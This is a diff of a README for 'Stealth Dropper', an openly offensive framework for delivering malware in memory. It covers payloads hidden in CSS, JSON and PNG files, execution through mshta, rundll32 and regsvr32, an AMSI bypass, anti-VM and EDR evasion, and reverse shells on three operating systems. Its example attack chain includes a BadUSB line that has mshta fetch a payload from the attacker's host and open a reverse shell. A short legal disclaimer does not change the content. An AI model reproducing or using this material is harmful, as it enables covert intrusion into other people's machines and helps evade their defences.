@@ -1,96 +1,97 @@
-# 🕵️‍♂️ Stealth-Dropper Framework
+# Stealth Dropper (2025 Edition)
 
-> Multi-stage, multi-platform in-memory payload delivery system — built for **stealth**, **flexibility**, and **modern bypass**.
+**Multi-stage, multi-OS, in-memory malware delivery framework**
 
----
-
-## 🎯 Features
-
-- 🔒 **Full In-Memory Execution**: No payloads are written to disk.
-- 🧠 **Multi-Stage Architecture**:
-  - Stage 1: lightweight dropper, decrypts & executes Stage 2
-  - Stage 2: encrypted payload (XOR + Base64), delivered via CSS/JSON/etc.
-- 🎭 **Payload Hiding**:
-  - Encrypted payloads embedded in:
-    - `style.css` (as `content`)
-    - `manifest.json`
-    - `favicon.png` (optional stego)
-- 🧬 **Built-in Obfuscation**:
-  - Encrypted XOR+Base64 payload
-  - LOLBins for execution (`mshta`, `regsvr32`, `rundll32`)
-- 🧾 **JavaScript Dropper (`decrypt.html`)**:
-  - Executes without `Invoke-Expression (IEX)`
-  - Designed for `mshta.exe` execution
-- 🦠 **Sandbox & AV Evasion**:
-  - Optional anti-VM/anti-sandbox checks (WIP)
-  - Designed for 2025-era Windows Defender + EDR bypass
-- 💻 **Multi-Platform Support**:
-  - Windows (PowerShell, LOLBins)
-  - Linux (bash payloads)
-  - macOS (osascript)
+## ✅ Features
+- AES-256 encrypted payload delivery
+- Full in-memory execution (no file drops)
+- Multi-OS support: Windows / Linux / macOS
+- Web-based stagers via mshta / rundll32 / regsvr32
+- Payload delivery via CSS, JSON, PNG (LSB stego)
+- Anti-VM / sandbox detection module
+- DuckyScript generation for WiFi BadUSB
 
 ---
 
 ## 📁 Project Structure
-
 ```
 stealth-dropper/
-├── build_and_run.sh          # Payload builder and runner
-├── config/                   # Configuration and runtime parameters
-├── payloads/                 # Organized by OS and payload type
-│   ├── windows/
-│   │   ├── shell_reverse/
-│   │   └── lolbins/
-│   ├── linux/
-│   └── mac/
-├── tools/                    # Encryptors, embedders, stego tools
-├── web/                      # Web delivery files (CSS, HTML, etc.)
-└── README.md
+├── build_and_run.sh        # main automation script
+├── config/                 # config/settings.json
+├── core/                   # anti_vm.ps1
+├── output/                 # generated stagers + logs
+├── payloads/               # raw stage 2 payloads by OS
+├── stagers/                # template stage 1 payloads for delivery
+├── tools/                  # encryption & embedding tools
+└── web/                    # hosted delivery files
 ```
 
 ---
 
-## 🚀 Quick Start
+## 🚀 How to Use
 
+### 1. Set encryption key in `.env`
+```
+ENCRYPTION_KEY=Zxcvbnm1234567890Zxcvbnm1234567890
+```
+
+### 2. Run the builder
 ```bash
 chmod +x build_and_run.sh
 ./build_and_run.sh
 ```
 
-The script will prompt you to select:
-1. Target OS (windows, linux, mac)
-2. Payload type (e.g. reverse shell)
-3. It will:
-   - Encrypt the raw payload
-   - Embed it in CSS or JSON
-   - Output the final files into `web/` for serving
+You'll be prompted to select:
+- Target IP and port
+- Target OS
+- Payload type (e.g. shell_reverse)
+- Delivery method (css / manifest / png)
+
+Result:
+- Stage 2 is AES-encrypted
+- Stage 1 (PowerShell / HTA / SCT) is generated
+- Payload is embedded in CSS/JSON/PNG
+- Server starts at `http://<your-ip>:<port>`
+- DuckyScript saved in `output/ducky_payload.txt`
 
 ---
 
-## 🛠 Tools Included
+## 🧪 Example Attack Chain (Windows)
+```
+1. Deliver WiFi Ducky:
+   > GUI r
+   > mshta http://<your-ip>:8000/decrypt.html
 
-- `encryptor.py`: XOR + Base64 encryption
-- `embed_in_css.py`: Injects payload into CSS `::after`
-- `embed_in_manifest.py`: JSON embedding (browser extension style)
-- `embed_in_png.py`: Stego placeholder (optional)
-
----
-
-## 🧪 Execution Flow (Windows example)
-
-1. Host `web/decrypt.html` + `style.css`
-2. User executes:
-   ```bash
-   mshta http://yourserver/decrypt.html
-   ```
-3. JavaScript reads encrypted payload from CSS
-4. Decodes → Decrypts → Executes in memory via `ScriptBlock::Create()`
-5. No artifacts left on disk
+2. HTML decrypts AES payload from CSS/JSON/PNG
+3. Executes PowerShell stage 2 in memory
+4. Reverse shell connects back to you
+```
 
 ---
 
-## ⚠️ Disclaimer
+## 📦 Supported Payloads
+- `windows/shell_reverse` → raw.ps1 TCP shell
+- `windows/lolbins/js_payload.html` → mshta/jscript shell
+- `linux/bash_reverse` → raw.sh reverse TCP
+- `mac/osascript` → raw.osascript reverse shell
 
-This framework is for **educational** and **authorized penetration testing** purposes **only**.
+---
 
-Use responsibly.
+## 🔐 Stealth Considerations
+- No IEX / no downloadstring / no Invoke-Obfuscation
+- AMSI bypass injected in stage 1
+- Anti-VM checks built-in (RAM, hostname, vendor)
+- No file drops unless explicitly instructed
+
+---
+
+## 🛠 Requirements
+- Python 3.8+
+- pip install -r requirements.txt
+- Dependencies: `python-dotenv`, `pycryptodome`, `Pillow`
+
+---
+
+## ⚠️ Legal Notice
+> This project is for educational and authorized testing use only.  
+> You are responsible for your actions. Do not deploy without explicit permission.
